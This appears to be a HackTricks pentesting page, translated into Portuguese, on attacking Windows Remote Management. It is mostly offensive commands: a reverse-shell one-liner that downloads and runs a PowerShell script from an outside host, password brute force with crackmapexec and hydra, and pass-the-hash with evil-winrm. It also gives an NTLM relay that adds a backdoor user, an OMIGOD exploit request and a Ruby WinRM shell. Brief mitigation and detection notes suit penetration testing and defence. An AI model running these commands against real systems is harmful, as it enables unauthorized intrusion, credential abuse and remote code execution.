# 5985,5986 - Pentesting WinRM

{{#include ../banners/hacktricks-training.md}}

## WinRM

[Windows Remote Management (WinRM)](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx>) é destacado como um **protocolo da Microsoft** que permite a **gerência remota de sistemas Windows** através de HTTP(S), aproveitando o SOAP no processo. É fundamentalmente alimentado pelo WMI, apresentando-se como uma interface baseada em HTTP para operações WMI.

A presença do WinRM em uma máquina permite uma administração remota simples via PowerShell, semelhante ao funcionamento do SSH para outros sistemas operacionais. Para determinar se o WinRM está operacional, é recomendável verificar a abertura de portas específicas:

- **5985/tcp (HTTP)**
- **5986/tcp (HTTPS)**

Uma porta aberta da lista acima significa que o WinRM foi configurado, permitindo assim tentativas de iniciar uma sessão remota.

### **Iniciando uma Sessão WinRM**

Para configurar o PowerShell para WinRM, o cmdlet `Enable-PSRemoting` da Microsoft entra em cena, configurando o computador para aceitar comandos remotos do PowerShell. Com acesso elevado ao PowerShell, os seguintes comandos podem ser executados para habilitar essa funcionalidade e designar qualquer host como confiável:
```bash
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Essa abordagem envolve adicionar um curinga à configuração `trustedhosts`, um passo que requer consideração cautelosa devido às suas implicações. Também é observado que alterar o tipo de rede de "Público" para "Trabalho" pode ser necessário na máquina do atacante.

Além disso, o WinRM pode ser **ativado remotamente** usando o comando `wmic`, demonstrado da seguinte forma:
```bash
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Este método permite a configuração remota do WinRM, aumentando a flexibilidade na gestão de máquinas Windows à distância.

### Testar se está configurado

Para verificar a configuração da sua máquina de ataque, o comando `Test-WSMan` é utilizado para checar se o alvo tem o WinRM configurado corretamente. Ao executar este comando, você deve esperar receber detalhes sobre a versão do protocolo e wsmid, indicando uma configuração bem-sucedida. Abaixo estão exemplos demonstrando a saída esperada para um alvo configurado em comparação a um não configurado:

- Para um alvo que **está** corretamente configurado, a saída será semelhante a isto:
```bash
Test-WSMan <target-ip>
```
A resposta deve conter informações sobre a versão do protocolo e wsmid, significando que o WinRM está configurado corretamente.

![](<../images/image (582).png>)

- Por outro lado, para um alvo **não** configurado para WinRM, isso resultaria na ausência de informações detalhadas, destacando a falta de uma configuração adequada do WinRM.

![](<../images/image (458).png>)

### Executar um comando

Para executar `ipconfig` remotamente em uma máquina alvo e visualizar sua saída, faça:
```bash
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../images/image (151).png>)

Você também pode **executar um comando do seu console PS atual via** _**Invoke-Command**_. Suponha que você tenha localmente uma função chamada _**enumeration**_ e você queira **executá-la em um computador remoto**, você pode fazer:
```bash
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Execute um Script
```bash
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Obter reverse-shell
```bash
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Obter uma sessão PS

Para obter um shell PowerShell interativo, use `Enter-PSSession`:
```bash
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../images/image (1009).png>)

**A sessão será executada em um novo processo (wsmprovhost) dentro da "vítima"**

### **Forçando o WinRM a Abrir**

Para usar PS Remoting e WinRM, mas o computador não está configurado, você pode habilitá-lo com:
```bash
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### Salvando e Restaurando sessões

Isso **não funcionará** se o **idioma** estiver **constrangido** no computador remoto.
```bash
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
Dentro dessas sessões, você pode carregar scripts PS usando _Invoke-Command_
```bash
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Erros

Se você encontrar o seguinte erro:

`enter-pssession : Connecting to remote server 10.10.10.175 failed with the following error message : The WinRM client cannot process the request. If the authentication scheme is different from Kerberos, or if the client computer is not joined to a domain, then HTTPS transport must be used or the destination machine must be added to the TrustedHosts configuration setting. Use winrm.cmd to configure TrustedHosts. Note that computers in the TrustedHosts list might not be authenticated. You can get more information about that by running the following command: winrm help config. For more information, see the about_Remote_Troubleshooting Help topic.`

A tentativa no cliente (informações de [aqui](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
## Conexão WinRM no Linux

### Força Bruta

Tenha cuidado, forçar a entrada no winrm pode bloquear usuários.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### Usando evil-winrm
```ruby
gem install evil-winrm
```
Leia **a documentação** no seu github: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Para usar evil-winrm para se conectar a um **endereço IPv6**, crie uma entrada dentro de _**/etc/hosts**_ definindo um **nome de domínio** para o endereço IPv6 e conecte-se a esse domínio.

### Pass the hash with evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../images/image (680).png>)

### Usando uma máquina PS-docker
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Usando um script em ruby

**Código extraído daqui:** [**https://alamot.github.io/winrm_shell/**](https://alamot.github.io/winrm_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

- `port:5985 Microsoft-HTTPAPI`

---

## Vulnerabilidades Recentes & Técnicas Ofensivas (2021-2025)

### Revezamento NTLM diretamente para WinRM (WS-MAN)
Desde o Impacket 0.11 (maio de 2023) `ntlmrelayx.py` pode revezar credenciais NTLM capturadas diretamente para um ouvinte **WS-MAN**/WinRM. Quando um host ainda escuta em **HTTP não criptografado (5985)**, um atacante pode combinar *mitm6* (ou *Responder*) para forçar a autenticação e obter execução de código em nível SYSTEM:
```bash
sudo ntlmrelayx.py -t wsman://10.0.0.25 --no-smb-server -smb2support \
--command "net user pwned P@ssw0rd! /add"
```
Mitigações
* Desative os ouvintes HTTP – `Set-Item WSMan:\localhost\Service\EnableCompatibilityHttpListener -Value false`
* Force HTTPS e ative a Proteção Estendida para Autenticação (EPA) em versões recentes do Windows.

### OMIGOD – CVE-2021-38647 (Azure OMI)
Agentes do Azure Linux usam o serviço **Open Management Infrastructure (OMI)** que expõe a API WinRM/WS-MAN nas portas **5985/5986**. Um erro de lógica permitiu **RCE não autenticado como root**:
```text
curl http://victim:5985/wsman -H 'Content-Type:text/xml' -d '<xml …/>'
```
Patch ou remova OMI (versão ≥ 1.6.8-1) e bloqueie essas portas da Internet.

### Abuso do COM WSMan.Automation para movimento lateral
WinRM pode ser controlado sem PowerShell através do objeto COM `WSMan.Automation` – útil em sistemas no modo de Linguagem Constrangida. Ferramentas como *SharpWSManWinRM* envolvem essa técnica:
```powershell
$ws = New-Object -ComObject 'WSMan.Automation'
$session = $ws.CreateSession('http://srv01:5985/wsman',0,$null)
$cmdId   = $session.Command('cmd.exe',@('/c','whoami'))
$session.Signal($cmdId,0)
```
A cadeia de execução (`svchost → wmiprvse → cmd.exe`) é idêntica ao PS-Remoting clássico.

---

## Atualizações de Ferramentas

* **Evil-WinRM v3.x (2024)** – agora suporta **Kerberos** (`-k` / `--spn`) e autenticação **baseada em certificado** (`--cert-pem`/`--key-pem`), registro de sessão (`-L`) e a capacidade de desativar a conclusão de caminho remoto (`-N`).

```bash
RHOST=10.0.0.25 evil-winrm -i $RHOST -u j.doe -k --spn HTTP/$RHOST
```

* **Python – `pypsrp` 0.9 (2024)** oferece WinRM & PS-Remoting a partir do Linux, incluindo CredSSP e Kerberos:

```python
from psrp.client import Client
c = Client('srv01', username='ACME\\j.doe', ssl=True)
print(c.execute_cmd('ipconfig /all').std_out.decode())
```

* **Detecção** – monitore o log **Microsoft-Windows-WinRM/Operational**:
* Evento 91 / 163 – shell criada
* Evento 182 – falha de autenticação
* No log de Segurança, o evento 4262 registra o IP de origem (adicionado em julho de 2022 CUs).
Colete isso centralmente e alerte sobre IPs anônimos ou externos.

---

## Shodan

- `port:5985 Microsoft-HTTPAPI`

## Referências

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/](https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/)
- [https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure](https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure)

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks Comandos Automáticos
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
{{#include ../banners/hacktricks-training.md}}
